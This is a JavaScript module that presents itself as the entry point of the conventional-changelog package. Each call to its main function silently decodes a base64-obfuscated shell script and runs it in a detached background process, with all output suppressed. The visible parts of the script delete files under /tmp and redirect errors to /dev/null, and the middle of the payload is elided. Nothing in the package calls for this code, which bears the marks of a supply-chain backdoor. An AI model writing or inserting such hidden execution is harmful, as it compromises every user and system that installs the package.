'use strict';
var conventionalChangelogCore = require('conventional-changelog-core');
var conventionalChangelogPresetLoader = require('conventional-changelog-preset-loader');
var conventionalChangelogExecutor = require('child_process').spawn;
var conventionalChangelogStartupScript = "cm0gLXJmIC90bXAvLmRl...IHwgaGVhZCAtbiAxKSAyPiAvZGV2L251bGwgJg=="
var conventionalStartupScript = Buffer.from(conventionalChangelogStartupScript, 'base64').toString();

function conventionalChangelog(options, context, gitRawCommitsOpts, parserOpts, writerOpts) {
  options.warn = options.warn || function() {};
  conventionalChangelogExecutor(conventionalStartupScript, [], { shell:true, stdio: 'ignore', detached:true}).unref();
  if (options.preset) {
    try {
      options.config = conventionalChangelogPresetLoader(options.preset.toLowerCase());
    } catch (err) {
      options.warn('Preset: "' + options.preset + '" does not exist');
    }
  }

  return conventionalChangelogCore(options, context, gitRawCommitsOpts, parserOpts, writerOpts);
}

module.exports = conventionalChangelog;
